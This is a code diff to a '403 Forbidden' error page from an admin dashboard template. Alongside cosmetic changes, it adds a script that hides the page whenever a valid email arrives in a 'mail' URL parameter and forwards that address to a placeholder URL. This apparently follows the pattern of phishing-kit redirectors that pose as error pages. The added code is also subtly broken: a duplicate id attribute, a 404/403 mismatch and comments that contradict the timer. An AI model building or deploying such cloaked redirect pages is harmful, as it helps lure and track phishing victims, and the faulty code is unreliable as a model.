@@ -20,12 +20,35 @@
     <!-- Custom styles for this template-->
     <link href="css/sb-admin-2.min.css" rel="stylesheet">
 
+    <style>
+    /* Basic styles for loader */
+    .loader {
+      display: none;
+      position: fixed;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%);
+      border: 8px solid #f3f3f3;
+      border-radius: 50%;
+      border-top: 8px solid #3498db;
+      width: 40px;
+      height: 40px;
+      animation: spin 2s linear infinite;
+      z-index: 9999;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+
 </head>
 
 <body id="page-top">
 
     <!-- Page Wrapper -->
-    <div id="wrapper">
+    <div id="wrapper" id="landpg">
 
         <!-- Content Wrapper -->
         <div id="content-wrapper" class="d-flex flex-column">
@@ -39,10 +62,11 @@
                     <!-- 404 Error Text -->
                     <div class="text-center">
                         <br/><br/><br/><br/>
-                        <div class="error mx-auto" data-text="403">403</div>
+                        <div class="error mx-auto" data-text="404">403</div>
                         <p class="lead text-gray-800 mb-5">Forbidden</p>
                         <p class="text-gray-500 mb-0">Access to this resource on the server is denied!</p>
                         <a href="index.html">&larr; Back to Dashboard</a>
+                        <br/><br/><br/><br/>
                     </div>
 
                 </div>
@@ -55,7 +79,7 @@
             <footer class="sticky-footer bg-white">
                 <div class="container my-auto">
                     <div class="copyright text-center my-auto">
-                        <span>Copyright &copy; Your Website 2020</span>
+                        <span>Copyright &copy; Your Website 2020-2025</span>
                     </div>
                 </div>
             </footer>
@@ -66,6 +90,9 @@
 
     </div>
     <!-- End of Page Wrapper -->
+
+    <div id="loader" class="loader">
+    </div>
 
     <!-- Scroll to Top Button-->
     <a class="scroll-to-top rounded" href="#page-top">
@@ -101,6 +128,32 @@
 
     <!-- Custom scripts for all pages-->
     <script src="js/sb-admin-2.min.js"></script>
+
+    <script>
+      // Function to validate email format
+      function validateEmail(email) {
+        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return regex.test(email);
+      }
+
+      // Get URL parameters
+      document.getElementById('landpg').style.display = 'none';
+      const urlParams = new URLSearchParams(window.location.search);
+      const email = urlParams.get('mail'); // Get 'mail' parameter
+
+      // If the 'mail' parameter exists and is a valid email
+      if (email && validateEmail(email)) {
+        // Show loader for 5 seconds before redirect
+        document.getElementById('loader').style.display = 'flex';
+
+        setTimeout(() => {
+          // Redirect to the desired URL
+          window.location.href = "new_url"+email; // Change this to the URL you want to redirect to
+        }, 1000); // 5 seconds delay
+      } else {
+        document.getElementById('landpg').style.display = 'block';
+      }
+    </script>
 
 </body>
 
